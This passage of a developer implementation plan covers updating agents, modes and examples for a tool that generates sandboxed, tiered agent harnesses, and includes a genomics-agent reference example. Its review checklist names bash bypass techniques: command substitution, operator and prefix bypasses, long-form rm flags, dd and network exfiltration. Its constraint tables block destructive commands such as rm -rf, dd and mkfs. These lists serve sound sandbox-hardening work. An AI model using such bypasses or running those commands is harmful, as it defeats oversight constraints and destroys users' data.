assert 'Open Questions' in content
assert 'Amplifier Escalation' in content
assert 'Capability inventory' in content
print('PASS: environment-analyst updated correctly')
"
```

Expected: "PASS: environment-analyst updated correctly"

### Step 4: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add agents/environment-analyst.md
git commit -m "feat: enhance environment-analyst with dynamic discovery and open questions

- Add dynamic capability discovery: runs amplifier module list and
  amplifier bundle list --all, organizes inventory by type
- Add open-question flow: one question at a time, multiple-choice preferred,
  fills gaps in mission understanding (like superpowers brainstorm)
- Add Amplifier escalation detection: recognizes when a mission needs full
  Amplifier and recommends accordingly
- Update output format: now includes capability inventory and escalation assessment"
```

---

## Task 7: Update Remaining 6 Agents

**What you're modifying:** The other 6 agents to make them tier-aware and integrate with the new mission-architect and capability-advisor outputs.

**Files to MODIFY:**
- `agents/spec-writer.md`
- `agents/plan-writer.md`
- `agents/harness-generator.md`
- `agents/harness-critic.md`
- `agents/harness-refiner.md`
- `agents/harness-evaluator.md`

### Step 1: Update `agents/spec-writer.md`

Add tier selection and mission statement to the spec template. Find the spec template section that starts with:

```
## Specification Document Template
```

Replace the entire template block with:

````markdown
## Specification Document Template

```markdown
# [Environment Name] Harness Specification

## Mission
[Mission statement from mission-architect — what this mini-amplifier does and why]

## Proposed Name
[{tier}-amplifier-{mission-slug} from mission-architect]

## Environment
[What environment is being constrained, action space description]

## Tier Selection
- **Tier:** [pico | nano | micro]
- **Rationale:** [Why this tier — from capability-advisor]

## Capability Selections
[Capability picker output from capability-advisor — which tools, provider, features]

## Harness Configuration
- **harness_type:** [action-filter | action-verifier | code-as-policy]
- **harness_scale:** [nano | single | library | factory | self-improving]
- **artifact_tier:** [Tier 1: nano-amplifier | Tier 2: harness bundle | Tier 3: harness machine]

## Constraints
### Constraint 1: [Name]
- **Action pattern:** [What actions this constrains]
- **Rule:** [The constraint logic]
- **Enforcement layer:** [behavioral | enforcement | policy]
- **Rationale:** [Why this constraint is necessary]
- **Edge cases:** [Known edge cases]

[Repeat for each constraint]

### Bash Constraints (if bash tool selected)
Reference: @harness-machine:context/constraint-spec-template.md
[Which categories from the template apply to this mission]

## Legal Action Space
[Definition of what constitutes a legal action in this environment]

## Acceptance Criteria
- **Legal action rate target:** [X%]
- **Reward threshold (if code-as-policy):** [value]
- **Maximum iterations:** [N]
- **Patience:** [N iterations before plateau diagnosis]
- **Critic rounds:** [4-5 explicit rounds budgeted]

## Target Environment
[Detailed environment description, state format, action format]
```
````

### Step 2: Update `agents/plan-writer.md`

Add tier-aware plan shapes. Find the "## Plan Shape by Scale" section. Replace it entirely with:

```markdown
## Plan Shape by Tier and Scale

### By Tier (new — determines runtime scaffold and feature depth)

| Tier | Plan Focus | Critic Rounds |
|------|-----------|---------------|
| **pico** | Constraint functions + basic CLI config. Simple plan. | 4-5 explicit rounds |
| **nano** | Constraints + runtime + streaming/session/context/provider config. Medium plan. | 4-5 explicit rounds |
| **micro** | Constraints + full runtime + modes/recipes/delegation/approval/loader config. Complex plan. | 4-5 explicit rounds |

### By Scale (existing — determines artifact scope)

### For nano / single scale

Produce a TDD-style task plan:

1. **Task list:** Each constraint function as a separate task
2. **Per task:** function signature, test cases, acceptance criteria
3. **Iteration budget:** 4-5 generate/critique/refine cycles (NOT "30 max iterations" — be explicit)
4. **Evaluation strategy:** Test environments, random seeds, step count
5. **setup.sh generation:** Include a task to generate the setup.sh from the tier's template

### For library scale

Produce a batch generation plan:

1. **Skill inventory:** Which domain skills need constraints
2. **Composition strategy:** How nano-amplifiers compose into a bundle
3. **Per-skill plan:** Constraint functions, tests, iteration budget (4-5 rounds each)
4. **Integration plan:** How composed bundle is tested

### For factory scale

Produce a machine specification:

1. **STATE.yaml schema:** Fields, status tracking, Thompson sampling state
2. **Environment list:** Each environment to generate harnesses for
3. **Recipe configuration:** Iteration limits, patience, parallelism
4. **Template design:** What templates are needed for .harness-machine/
```

### Step 3: Update `agents/harness-generator.md`

Add tier-aware generation and reserved CLI name checking. Find the "## Generation Process" section. After "### 1. Read the Specification", add a new sub-section:

```markdown
### 1b. Determine Generation Scope by Tier

The delegation instruction includes the selected tier. This determines what you generate:

| Tier | What You Generate | What Comes From Scaffold |
|------|-------------------|--------------------------|
| **pico** | constraints.py, config.yaml, system-prompt.md, context.md, test_constraints.py, behavior.yaml | CLI, runtime, tools, gate copied from `runtime/pico/` |
| **nano** | Same as pico + streaming config, session config, provider config, context references | Same as pico + streaming.py, session.py, context.py, providers.py from `runtime/nano/` |
| **micro** | Same as nano + modes config, recipe templates, delegation config, approval config | Same as nano + modes.py, recipes.py, delegate.py, approval.py, loader.py from `runtime/micro/` |

**You generate the domain-specific artifacts.** The runtime scaffold is COPIED by `/harness-finish`, not generated by you.

### 1c. Reserved CLI Name Check

Before generating, verify the proposed CLI name does not collide with common Unix utilities.
Check the name against this list:

```
pico, nano, micro, vi, vim, emacs, cat, less, more, grep, find, awk, sed, sort,
cut, tr, wc, diff, patch, test, true, false, make, ls, cp, mv, rm, mkdir, touch,
chmod, chown, ln, tar, gzip, zip, curl, wget, ssh, git, python, python3, pip,
node, npm, docker, kubectl, helm
```

If the FULL CLI name (e.g., `nano-amplifier-tumor-genome-to-vaccine`) starts with a
reserved word followed by a hyphen, this is NOT a collision — the full hyphenated name
is the CLI command. Only exact matches are collisions.

If a collision is detected, STOP and report it. Do not generate.
```

Also update the "### Required Output Files" table and the "### config.yaml Format" to include tier:

Find:
```yaml
project_root: /path/to/project
model: anthropic/claude-sonnet-4-20250514
harness_type: action-verifier  # action-filter | action-verifier | code-as-policy
max_retries: 3
```

Replace with:
```yaml
project_root: /path/to/project
model: anthropic/claude-sonnet-4-20250514
tier: nano  # pico | nano | micro
harness_type: action-verifier  # action-filter | action-verifier | code-as-policy
max_retries: 3
max_iterations: 20
```

### Step 4: Update `agents/harness-critic.md`

Add expanded review checklist. Find the existing "## What You Check" table and replace it with:

```markdown
## What You Check

| Check | Pass | Fail |
|-------|------|------|
| All spec constraints implemented | Every constraint has code | Missing constraint |
| No coverage gaps | Adversarial inputs handled | Bypass possible |
| No over-constraints | All valid actions accepted | Valid action rejected |
| No conflicts | Constraints are consistent | Constraints contradict |
| Error handling | Malformed input handled | Code raises on bad input |
| YAML valid | behavior.yaml parses | YAML error |
| **CLI name collision** | Name not in reserved list | Name collides with Unix utility |
| **System prompt accuracy** | Mentions only actual tools | Mentions tools agent doesn't have |
| **Signal handling present** | CLI has Ctrl-C/Ctrl-D handling | Missing signal handling |
| **Config completeness** | No hardcoded values that should be in config | Hardcoded model name, path, etc. |
| **Rich rendering present** | CLI uses Rich for markdown output | Plain text output |
| **Bash constraints** (if bash tool) | All categories from constraint-spec-template.md checked | Missing attack vector category |
```

Also add after the "## What You DON'T Check" section:

```markdown
## Bash Constraint Review

If the mini-amplifier includes the bash tool, review constraints against ALL
categories in @harness-machine:context/constraint-spec-template.md:

1. Command substitution (`$()`, backticks, `<()`, `>()`)
2. Operator bypasses (`;`, `&&`, `||`, `|`, `>|`, `<>`)
3. Prefix bypasses (env, timeout, nice, nohup, xargs, find -exec)
4. Absolute path invocation
5. Output redirection target validation
6. rm long-form flags (--recursive, --force)
7. dd safeguards
8. Network exfiltration (if network is blocked)

For each category, verify the constraints handle it or document why it's not applicable.
```

### Step 5: Update `agents/harness-refiner.md`

Add tier awareness. After the existing "## Refinement Process" section heading, add this note:

```markdown
### 0. Tier Awareness

The delegation instruction includes the selected tier (pico/nano/micro). Be aware of
tier-specific requirements when refining:

- **Pico:** Constraints only. No streaming, session, or provider code to worry about.
- **Nano:** May need to refine streaming config, session config, or provider config
  alongside constraints.
- **Micro:** May need to refine mode definitions, recipe templates, delegation config,
  or approval rules alongside constraints.

When the critic flags a tier-specific issue (e.g., "streaming config references a tool
the agent doesn't have"), fix it with targeted changes — same as constraint fixes.
```

### Step 6: Update `agents/harness-evaluator.md`

Add CLI and system prompt verification. Find the existing "### For factory artifacts" section and add after it:

```markdown
### For mini-amplifier CLI verification (all tiers)

In addition to constraint evaluation, verify the generated mini-amplifier's operational readiness:

1. **CLI starts:** Run `{name} check bash '{"command": "echo hello"}'` — must exit 0 or 1 (not crash)
2. **Chat mode initializes:** Run `echo "hello" | {name} chat` — must not crash on startup
3. **System prompt accuracy:** Read system-prompt.md and verify it mentions ONLY tools
   that are actually included (no phantom tools)
4. **Config loads:** Read config.yaml and verify all required keys are present:
   `project_root`, `model`, `tier`, `harness_type`, `max_retries`
5. **All selected tools functional:** For each tool in the config, verify the
   executor has a method for it
6. **Amplifier hook loads:** Run `python -c "import yaml; yaml.safe_load(open('behavior.yaml'))"` — must succeed
```

### Step 7: Verify all 6 updated agents still parse correctly

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
import yaml
agents = ['spec-writer', 'plan-writer', 'harness-generator', 'harness-critic',
          'harness-refiner', 'harness-evaluator']
for name in agents:
    with open(f'agents/{name}.md') as f:
        content = f.read()
    parts = content.split('---')
    fm = yaml.safe_load(parts[1])
    assert fm['meta']['name'] == name, f'{name}: name mismatch'
    assert fm['meta']['description'], f'{name}: empty description'
    print(f'  PASS: {name}')
print('ALL 6 agents updated and valid')
"
```

Expected: All 6 pass.

### Step 8: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add agents/spec-writer.md agents/plan-writer.md agents/harness-generator.md \
        agents/harness-critic.md agents/harness-refiner.md agents/harness-evaluator.md
git commit -m "feat: update 6 agents for tier-aware generation and expanded review

- spec-writer: spec template now includes tier selection, mission statement,
  capability selections, bash constraint template reference, explicit critic
  round budget (4-5 rounds, not 'max 30')
- plan-writer: tier-aware plan shapes (pico=simple, nano=medium, micro=complex),
  explicit 4-5 critic rounds per plan, setup.sh generation task
- harness-generator: tier-aware generation scope table (what you generate vs
  what comes from scaffold), reserved CLI name checker, config.yaml now includes
  tier and max_iterations
- harness-critic: expanded review checklist (CLI name collision, system prompt
  accuracy, signal handling, config completeness, rich rendering, bash constraint
  categories from constraint-spec-template.md)
- harness-refiner: tier awareness note for streaming/session/mode/recipe fixes
- harness-evaluator: CLI verification protocol (check subcommand, chat mode
  startup, system prompt accuracy, config loading, tool functionality, hook loading)"
```

---

## Phase C: Modes + Examples + Integration

Phase C updates all 7 modes, adds tier-specific reference examples, and wires the bundle together with updated registration and tests.

---

## Task 8: Update All 7 Modes + 3 Context Files

**What you're modifying:** All 7 mode files and 3 context files to add tier awareness, dynamic discovery, mission naming, and the capability picker flow.

**Files to MODIFY:**
- `modes/harness-explore.md`
- `modes/harness-spec.md`
- `modes/harness-plan.md`
- `modes/harness-execute.md`
- `modes/harness-verify.md`
- `modes/harness-finish.md`
- `modes/harness-debug.md`
- `context/instructions.md`
- `context/harness-format.md`
- `context/pattern.md`

### Step 1: Update `modes/harness-explore.md`

Add dynamic discovery, capability picker, open-question flow, and delegation to the two new agents. Find the existing todo checklist:

```
- [ ] Understand what the user wants to constrain
- [ ] Ask clarifying questions about the action space (one at a time)
- [ ] Delegate to environment-analyst for systematic investigation
- [ ] Present feasibility assessment to user
- [ ] Transition to /harness-spec
```

Replace with:

```
- [ ] Understand what the user wants to BUILD (mission, not just constraints)
- [ ] Ask clarifying questions about the mission (one at a time, like superpowers brainstorm)
- [ ] Delegate to environment-analyst for systematic investigation AND dynamic discovery
- [ ] Delegate to mission-architect to produce meaningful name and documentation
- [ ] Delegate to capability-advisor to recommend tier, tools, and provider
- [ ] Present feasibility assessment + capability picker to user
- [ ] Transition to /harness-spec
```

Find "### Phase 3: Delegate Investigation" and replace the entire Phase 3 AND Phase 4 with:

```markdown
### Phase 3: Delegate Investigation + Discovery

Once you understand the target, delegate to the environment-analyst AND the two new agents:

**3a. Environment analysis (same as before):**
```
delegate(
  agent="harness-machine:environment-analyst",
  instruction="Explore the following environment for harness generation feasibility: [environment description]. Map the action space, identify legal/illegal action boundaries, assess whether constraints can be defined programmatically. ALSO run dynamic capability discovery (amplifier module list, amplifier bundle list --all). Target: [what the user described]. Context: [key answers from dialogue].",
  context_depth="recent",
  context_scope="conversation"
)
```

**3b. Mission naming:**
```
delegate(
  agent="harness-machine:mission-architect",
  instruction="Create the identity for a mini-amplifier with this mission: [mission description]. Tier will be determined by capability-advisor. Produce: meaningful name ({tier}-amplifier-{mission-slug}), system-prompt.md draft, README.md draft, context.md draft.",
  context_depth="recent",
  context_scope="conversation"
)
```

**3c. Capability recommendation:**
```
delegate(
  agent="harness-machine:capability-advisor",
  instruction="Recommend capabilities for a mini-amplifier with this mission: [mission description]. Module inventory: [from environment-analyst if available]. Produce: recommended tier (pico/nano/micro), recommended tools with rationale, recommended provider, capability picker markdown.",
  context_depth="recent",
  context_scope="conversation"
)
```

### Phase 4: Present Results + Capability Picker

When all three agents return, present a unified summary:

1. **Feasibility:** Can this be harnessed? (from environment-analyst)
2. **Proposed name:** `{tier}-amplifier-{mission-slug}` (from mission-architect)
3. **Recommended tier:** pico/nano/micro with rationale (from capability-advisor)
4. **Capability picker:** The markdown checkbox interface (from capability-advisor)
5. **Blockers or risks:** Anything identified by the analyst

The user reviews the capability picker, adjusts selections, and approves the name.
Then proceed to `/harness-spec`.

**Amplifier escalation:** If the environment-analyst detected that the mission needs
full Amplifier, present this clearly: "This mission exceeds what a mini-amplifier can
provide. For a full Amplifier session: `amplifier run -B foundation`". The user can
still proceed, but the risk is documented.
```

### Step 2: Update `modes/harness-spec.md`

Add tier selection and mission name approval. Find "### Phase 1: Choose Harness Type" and insert BEFORE it:

```markdown
### Phase 0: Confirm Tier and Name

Before discussing harness type, confirm the selections from `/harness-explore`:

1. **Tier:** pico / nano / micro (from capability-advisor). Present trade-offs if the user wants to change.
2. **Name:** `{tier}-amplifier-{mission-slug}` (from mission-architect). User can modify.
3. **Capability selections:** Tools, provider, features (from capability picker). User can adjust.

These three inputs feed into the spec. If `/harness-explore` was skipped, you must gather
this information now by delegating to mission-architect and capability-advisor.
```

Also update the delegate instruction in "### Phase 5: Delegate Spec Creation" to include tier:

Find:
```
  instruction="Write the harness specification for: [name]. Save to docs/plans/YYYY-MM-DD-<name>-harness-spec.md. Include all validated sections: harness_type=[type], harness_scale=[scale], constraints=[list], acceptance_criteria=[criteria], environment=[description]. Here is the complete validated specification: [all sections]",
```

Replace with:
```
  instruction="Write the harness specification for: [name]. Save to docs/plans/YYYY-MM-DD-<name>-harness-spec.md. Include all validated sections: tier=[pico|nano|micro], mission=[statement], name=[{tier}-amplifier-{mission-slug}], capabilities=[from picker], harness_type=[type], harness_scale=[scale], constraints=[list], bash_constraints=[categories from constraint-spec-template.md], acceptance_criteria=[criteria], environment=[description]. Here is the complete validated specification: [all sections]",
```

### Step 3: Update `modes/harness-plan.md`

Add tier-aware plan shape discussion. Find "## Plan Shape by Scale" and add BEFORE it:

```markdown
## Plan Shape by Tier

The tier from the spec determines the plan complexity:

| Tier | Plan Complexity | Key Additions Over Pico |
|------|----------------|------------------------|
| **pico** | Simple — constraint functions, basic CLI config, setup.sh | None — the baseline |
| **nano** | Medium — add streaming config, session config, provider config, context refs | 4 extra config files |
| **micro** | Complex — add modes config, recipe templates, delegation config, approval rules | 5 extra config files + mode definitions |

The plan-writer agent uses this to allocate the right number of tasks and critic rounds.
```

### Step 4: Update `modes/harness-execute.md`

Add tier-aware generation dispatch. Find "### Stage 1: DELEGATE to harness-generator" and update the delegation instruction to include tier:

Find:
```
  instruction="""Generate constraint code for: [harness name]

Harness type: [action-filter|action-verifier|code-as-policy]
Environment: [description]
Constraints from spec: [constraint list]
```

Replace with:
```
  instruction="""Generate constraint code for: [harness name]

Tier: [pico|nano|micro]
Harness type: [action-filter|action-verifier|code-as-policy]
Environment: [description]
Constraints from spec: [constraint list]
Capability selections: [tools, provider, features from spec]
Mission statement: [from spec]
System prompt draft: [from mission-architect, included in spec]
```

### Step 5: Update `modes/harness-verify.md`

Add CLI verification. After the existing "### factory" section (before "## Delegation During Verification"), add:

```markdown
### mini-amplifier CLI (all tiers)

In addition to constraint evaluation, verify operational readiness:

1. **CLI starts:** `{name} check bash '{"command": "echo hello"}'` — exits 0 or 1, not crash
2. **Chat mode initializes:** `echo "hello" | {name} chat` — no startup crash
3. **System prompt matches capabilities:** Read system-prompt.md, verify it only mentions tools the agent actually has
4. **Config loads correctly:** Read config.yaml, verify required keys present (`project_root`, `model`, `tier`, `harness_type`, `max_retries`)
5. **All selected tools functional:** For each tool in config, verify the executor handles it
6. **Amplifier hook loads:** `python -c "import yaml; yaml.safe_load(open('behavior.yaml'))"`
```

### Step 6: Update `modes/harness-finish.md`

Add tier-aware packaging. Find "**Stud 2: Standalone CLI**" and replace the standalone CLI section with:

```markdown
**Stud 2: Standalone CLI** — run without Amplifier:

Copy the tier-appropriate runtime scaffold:

| Tier | Source | Files Copied |
|------|--------|-------------|
| pico | `runtime/pico/` | cli.py, runtime.py, tools.py, gate.py (9 files) |
| nano | `runtime/nano/` | All pico files + streaming.py, session.py, context.py, providers.py (13 files) |
| micro | `runtime/micro/` | All nano files + modes.py, recipes.py, delegate.py, approval.py, loader.py (18 files) |

```
standalone/
  <package_name>/
    cli.py, runtime.py, tools.py, gate.py   # From tier scaffold
    [streaming.py, session.py, ...]         # Additional files per tier
    constraints.py                           # Copy of the generated brick
    config.yaml                              # Copy of runtime config
    system-prompt.md                         # From mission-architect
  pyproject.toml                             # Stamped from tier's pyproject.toml.template
  setup.sh                                   # Stamped from tier's setup.sh.template
```

**Generate setup.sh:** Stamp `runtime/{tier}/setup.sh.template` with `{{harness_name}}`.
```

Also update the "### Step 3: Summarize the Work" section to present the meaningful name:

Find:
```
Present: what was generated, evaluation metrics, artifact location.
```

Replace with:
```
Present: meaningful name, tier, what was generated, evaluation metrics, artifact location.

Example:
```
Mini-amplifier: nano-amplifier-tumor-genome-to-vaccine
Tier: nano (streaming + session persistence for long research sessions)
Constraints: 8 rules (filesystem boundary, bash sandboxing, network whitelist, ...)
Legal action rate: 100%
Tools: read_file, write_file, edit_file, bash, grep, glob, web_fetch, python_check
Provider: Anthropic Claude
Artifact: harnesses/nano-amplifier-tumor-genome-to-vaccine/
```
```

### Step 7: Update `modes/harness-debug.md`

Add tier-specific debugging. After the existing "### Failure Mode 4: Evaluation Error" section, add:

```markdown
### Failure Mode 5: Tier-Specific Feature Issues (nano/micro only)

**Symptom:** Streaming doesn't work, session persistence fails, mode switching breaks,
delegation times out, or approval gates don't trigger.

**Investigation:**
1. Identify which tier-specific feature is failing
2. Check: is the feature correctly imported in runtime.py?
3. Check: is the config for this feature present in config.yaml?
4. Check: does the CLI wire up the feature (--no-stream, --resume, /mode, /delegate)?

| Feature | Config Key | CLI Flag/Command | Runtime Import |
|---------|-----------|-----------------|----------------|
| Streaming | `stream: true` in config | `--no-stream` | `from .streaming import StreamHandler` |
| Session persistence | `.sessions/` directory | `--resume SESSION_ID` | `from .session import SessionManager` |
| Provider switching | `providers:` in config | `/provider NAME` | `from .providers import ProviderManager` |
| Dynamic context | `context_paths:` in config | N/A (auto-loaded) | `from .context import ContextLoader` |
| Mode switching | `modes:` in config | `/mode NAME` | `from .modes import ModeManager` |
| Recipes | recipe YAML files | `/recipe PATH` | `from .recipes import RecipeRunner` |
| Delegation | N/A | `/delegate TASK` | `from .delegate import Delegator` |
| Approval gates | `approval_mode:` in config | `--approval-mode` | `from .approval import ApprovalGate` |
```

### Step 8: Update `context/instructions.md`

Add tier awareness, dynamic discovery, and mission naming. Find the "## Two-Track UX" section and add BEFORE it:

```markdown
## Three Size Tiers

Mini-amplifiers come in three sizes. The tier is selected during `/harness-explore`
and confirmed during `/harness-spec`:

| Tier | Lines | Capabilities | Best For |
|------|-------|-------------|----------|
| **pico** | 800-1,500 | 50% at ~10% size | Single-purpose agents, quick prototypes |
| **nano** | 2,000-3,500 | 80% at ~20% size | Purpose-built specialists, daily-use tools |
| **micro** | 5,000-8,000 | 80%+ at ~40% size | Complex workflows, team tools, production |

## Dynamic Discovery

During `/harness-explore`, the bundle discovers what's available in the user's Amplifier
ecosystem by running `amplifier module list` and `amplifier bundle list --all`. The
capability picker is always current — as the ecosystem grows, the picker grows with it.

## Mission Naming

Every mini-amplifier gets a meaningful name: `{tier}-amplifier-{mission-slug}`.
The mission-architect agent creates this from the user's mission description.
Examples: `pico-amplifier-tumor-genome-to-vaccine`, `nano-amplifier-k8s-security-auditor`.
```

Also update the intent mapping table. Find:
```
| "I want to constrain an agent" / "explore this environment" / "what actions are available" | `/harness-explore` |
```

Replace with:
```
| "I want to constrain an agent" / "explore this environment" / "build me an agent that..." / "I need a mini-amplifier for..." | `/harness-explore` |
```

### Step 9: Update `context/harness-format.md`

Add the three-tier artifact format. Find "### Tier 1: Nano-Amplifier (3 studs)" and insert BEFORE it:

```markdown
### Size Tiers

Mini-amplifiers are generated at one of three size tiers. The tier determines which
runtime scaffold is copied and which features are available:

| Tier | Runtime Scaffold | Features |
|------|-----------------|----------|
| **pico** | `runtime/pico/` (9 files) | Constraint gate, basic CLI, 7 tools, Rich rendering, signal handling |
| **nano** | `runtime/nano/` (13 files) | Everything in pico + streaming, session persistence, dynamic context, multi-provider |
| **micro** | `runtime/micro/` (18 files) | Everything in nano + modes, recipes, delegation, approval gates, plugin loader |

The tier is selected during `/harness-spec` based on the capability-advisor's recommendation.

```

### Step 10: Update `context/pattern.md`

Add three-tier pattern description. Find "## Seven Components" and insert BEFORE it:

```markdown
## Three-Tier Architecture

The harness machine generates mini-amplifiers at three compression levels:

**Pico** — The constraint specialist. One provider, selected tools, constraint gate, basic CLI.
No sub-agents, no recipes, no modes. Think: `pico-amplifier-tumor-genome-to-vaccine`.

**Nano** — The sweet spot. All tools the user selects, streaming responses, session persistence,
dynamic context, multi-provider. 80% of Amplifier's capabilities at 20% of the size.
Think: daily-use domain specialists.

**Micro** — Near-full Amplifier. Modes (work/review/plan), recipes (multi-step workflows),
sub-agent delegation, approval gates, dynamic module loading. Think: production systems.

Each tier builds on the previous: nano copies pico and adds files, micro copies nano and adds files.
The runtime scaffolds live in `runtime/pico/`, `runtime/nano/`, `runtime/micro/`.

```

### Step 11: Verify all mode files still have valid frontmatter

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
import yaml
modes = ['harness-explore', 'harness-spec', 'harness-plan', 'harness-execute',
         'harness-verify', 'harness-finish', 'harness-debug']
for name in modes:
    with open(f'modes/{name}.md') as f:
        content = f.read()
    parts = content.split('---')
    fm = yaml.safe_load(parts[1])
    assert fm['mode']['name'] == name, f'{name}: name mismatch'
    assert isinstance(fm['mode']['tools']['safe'], list), f'{name}: bad tools.safe'
    print(f'  PASS: {name}')
print('ALL 7 modes updated and valid')
"
```

Expected: All 7 pass.

### Step 12: Verify context files updated

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -c "
with open('context/instructions.md') as f:
    c = f.read()
assert 'Three Size Tiers' in c
assert 'Dynamic Discovery' in c
assert 'Mission Naming' in c

with open('context/harness-format.md') as f:
    c = f.read()
assert 'Size Tiers' in c
assert 'runtime/pico/' in c

with open('context/pattern.md') as f:
    c = f.read()
assert 'Three-Tier Architecture' in c
assert 'Pico' in c and 'Nano' in c and 'Micro' in c

print('PASS: all 3 context files updated')
"
```

Expected: "PASS: all 3 context files updated"

### Step 13: Commit

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git add modes/ context/instructions.md context/harness-format.md context/pattern.md
git commit -m "feat: update 7 modes and 3 context files for tier-aware mini-amplifier factory

- harness-explore: add dynamic discovery (amplifier module/bundle list), delegation
  to mission-architect and capability-advisor, capability picker presentation,
  open-question flow, Amplifier escalation detection
- harness-spec: add Phase 0 (confirm tier + name + capabilities before harness type),
  tier in delegation instruction
- harness-plan: add tier-aware plan shape table (pico=simple, nano=medium, micro=complex)
- harness-execute: add tier and capability selections to generator delegation
- harness-verify: add CLI verification protocol (check, chat, system prompt, config, tools, hook)
- harness-finish: tier-aware scaffold copying table, setup.sh generation, meaningful
  name in delivery summary
- harness-debug: add Failure Mode 5 (tier-specific feature issues) with feature/config/CLI table
- instructions.md: add three size tiers, dynamic discovery, mission naming sections
- harness-format.md: add size tier table with runtime scaffold mapping
- pattern.md: add three-tier architecture description"
```

---

## Task 9: Reference Examples

**What you're building:** Three reference examples (one per tier) — renaming the existing pico example and adding two new ones including the cancer dog story.

**Files to MODIFY:**
- `context/examples/nano-filesystem-harness.md` → rename to `context/examples/pico-filesystem-sandbox.md`
- `context/examples/enterprise-governance-harness.md` (update to reference tier system)

**Files to CREATE:**
- `context/examples/nano-tumor-genome-to-vaccine.md`
- `context/examples/micro-k8s-platform-engineer.md`

**Files to DELETE:**
- `context/examples/nano-filesystem-harness.md` (replaced by renamed version)

### Step 1: Rename the pico filesystem example

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
git mv context/examples/nano-filesystem-harness.md context/examples/pico-filesystem-sandbox.md
```

Then edit `context/examples/pico-filesystem-sandbox.md` to update the header. Find:

```
# Example: Nano Filesystem Harness
**Scale:** Trivial (nano) — Constrain an agent to read/write within a single directory.
```

Replace with:

```
# Example: Pico Filesystem Sandbox
**Tier:** Pico — Single-purpose agent constraining filesystem access to one directory.
**Scale:** Trivial (nano) — 5 constraints, minimal CLI.
```

### Step 2: Create `context/examples/nano-tumor-genome-to-vaccine.md`

This is the cancer dog story example.

```markdown
# Example: Nano Tumor-Genome-to-Vaccine
**Tier:** Nano — Purpose-built specialist with streaming + session persistence for long research sessions.
**Scale:** Single — Multiple constraints, one environment.
**Walkthrough:** Mission → Name → Capabilities → Spec → Plan → Artifact, annotated with WHY.

---

## THE MISSION

> A tech guy in Australia adopts a cancer-riddled rescue dog with months to live.
> He pays $3,000 to sequence her tumor DNA, feeds it to ChatGPT and AlphaFold,
> identifies mutated proteins, matches them to drug targets, and designs a custom
> mRNA cancer vaccine from scratch — with zero background in biology.
> The tumor halves. The dog is alive and happy.
>
> "If we can do this for a dog, why aren't we rolling this out to humans?"

This mini-amplifier automates the pipeline: tumor genome → mutated proteins → immune
targets → mRNA vaccine design. It's a nano-tier specialist with web access (for querying
genomics databases), bash (for bioinformatics tools), and streaming (for long research
sessions that can take hours).

## MISSION-ARCHITECT OUTPUT

**Proposed name:** `nano-amplifier-tumor-genome-to-vaccine`
**Pipeline:** DNA → mutated proteins → immune targets → mRNA vaccine

> **Why "tumor-genome-to-vaccine", not "genomics" or "cancer-research"?**
> The name describes the INPUT → OUTPUT pipeline, not just the domain.
> Someone reading the name immediately understands what this agent does.

## CAPABILITY-ADVISOR OUTPUT

**Recommended tier:** Nano
- Needs streaming (long research sessions, progressive results)
- Needs session persistence (multi-day research, resume where you left off)
- Does NOT need delegation, modes, or recipes (single focused pipeline)

**Recommended provider:** Anthropic Claude
- Strong reasoning for protein structure analysis
- Good at multi-step scientific workflows

**Recommended tools:**
- [x] read_file / write_file / edit_file / apply_patch — reading/writing sequence data, analysis scripts
- [x] bash — running bioinformatics tools (BLAST, samtools, bcftools, minimap2)
- [x] grep / glob — searching sequence databases, finding result files
- [x] web_fetch — querying NCBI, UniProt, AlphaFold, PDB databases
- [x] web_search — finding relevant papers, drug databases, clinical trials
- [x] python_check — validating analysis scripts before execution
- [ ] ~~delegate~~ — not needed (single pipeline, not parallel tasks)
- [ ] ~~modes~~ — not needed (one workflow, not multiple behaviors)

## SPEC

```
harness_type:  action-verifier
harness_scale: single
tier:          nano
target:        Genomics research agent operating on tumor sequencing data
```

### Constraints (7)

| # | Constraint | Rationale |
|---|-----------|-----------|
| 1 | **Sandbox boundary** — all file ops inside project directory | Protect host system from accidental writes to system files |
| 2 | **No parent traversal** — reject `..` in paths | Defense-in-depth against sandbox escape |
| 3 | **Bash allowlist** — only bioinformatics tools + standard utils | Prevent arbitrary command execution; allow BLAST, samtools, bcftools, minimap2, python3 |
| 4 | **No command substitution** — block `$()`, backticks, `<()`, `>()` | Prevent embedding blocked commands inside allowed ones |
| 5 | **Network whitelist** — web_fetch only to approved domains | Allow NCBI, UniProt, AlphaFold, PDB; block everything else |
| 6 | **No destructive commands** — block rm -rf, dd, mkfs | Protect research data from accidental deletion |
| 7 | **Max file size** — reject reads/writes > 100 MB | Prevent memory exhaustion from large BAM/FASTQ files |

> **Why 7 constraints, not 5?**
> Genomics pipelines involve network access (querying databases), bash execution
> (running BLAST), and large files (BAM/FASTQ). Each of these adds attack surface
> that a pure filesystem agent doesn't have. The extra constraints cover network
> whitelisting and command substitution — both critical for a tool-heavy agent.

## GENERATED SYSTEM PROMPT (excerpt)

```markdown
You are nano-amplifier-tumor-genome-to-vaccine — a specialist agent for analyzing
tumor genomics data and designing mRNA cancer vaccines.

## Mission
Guide the user through the pipeline: tumor genome sequencing data → identify mutated
proteins → match to immune targets → design mRNA vaccine candidates.

## Your Tools
- **File operations:** read_file, write_file, edit_file for working with sequence data and analysis scripts
- **Bash:** Run bioinformatics tools (BLAST, samtools, bcftools, minimap2, python3)
- **Web access:** Query NCBI, UniProt, AlphaFold, PDB databases (approved domains only)
- **Code checking:** python_check for validating analysis scripts

## Domain Knowledge
- FASTA/FASTQ formats for sequence data
- VCF format for variant calls
- PDB format for protein structures
- mRNA vaccine design: identify neoantigens, predict MHC binding, design coding sequences

## Capability Boundaries
If this task requires capabilities beyond your tool set (for example, you need
sub-agents but don't have delegate, or you need a recipe but don't have the
recipe runner), say: "This task exceeds my capabilities. For a full Amplifier
session with [needed capability], run: `amplifier run -B foundation`"
```

## GENERATED ARTIFACT STRUCTURE

```
nano-amplifier-tumor-genome-to-vaccine/
  constraints.py            # 7 constraint rules
  test_constraints.py       # Unit tests for each constraint
  config.yaml               # tier: nano, model, providers, streaming config
  system-prompt.md           # Domain-specific (knows genomics)
  context.md                # Domain knowledge + constraint rationale
